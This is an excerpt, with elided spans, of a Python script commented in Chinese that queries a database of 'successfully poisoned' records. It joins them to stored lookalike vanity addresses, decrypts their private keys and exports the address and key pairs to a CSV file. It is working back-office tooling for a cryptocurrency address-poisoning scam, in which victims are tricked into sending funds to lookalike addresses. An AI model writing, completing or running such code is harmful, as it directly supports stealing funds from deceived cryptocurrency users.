...
"""
导出成功投毒的地址和私钥到CSV
用法: python3 export_addresses.py
"""
...
def main():
    ...
    # 查询成功投毒的地址 (fake_address在poison_records中不带0x)
    print("📊 正在查询成功投毒地址...")
    cursor.execute("""
        SELECT DISTINCT pr.fake_address, va.encrypted_private_key
        FROM poison_records pr
        JOIN vanity_addresses va ON LOWER(pr.fake_address) = LOWER(va.address)
        WHERE pr.status = 'success'
        ORDER BY pr.fake_address
    """)
    ...
    with open(filepath, 'w', newline='') as f:
        ...
        for address, encrypted_pk in rows:
            try:
                if encrypted_pk:
                    ...
                    if not addr.startswith('0x'):
                        addr = '0x' + addr
                    writer.writerow([addr, private_key])
                    success_count += 1
            except Exception as e:
                print(f"⚠️  解密失败: {address} - {e}")
                error_count += 1
